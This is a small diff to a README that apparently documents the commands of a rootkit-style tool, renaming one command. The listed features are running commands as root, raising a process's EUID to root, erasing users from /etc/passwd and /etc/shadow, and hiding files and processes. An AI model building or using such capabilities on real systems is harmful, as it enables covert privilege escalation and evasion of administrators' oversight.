@@ -5,7 +5,7 @@
 
 ## commands
 - `command ARGS` -> execute the arguments as root
-- `descend PID` -> set a process's EUID to its UID
+- `drop PID` -> set a process's EUID to its UID
 - `elevate PID` -> set a process's EUID to root
 - `ghost UID` -> remove a user from "/etc/passwd" and "/etc/shadow"
 - `hide PATH` -> hide an entity ("/proc" paths are treated as processes)
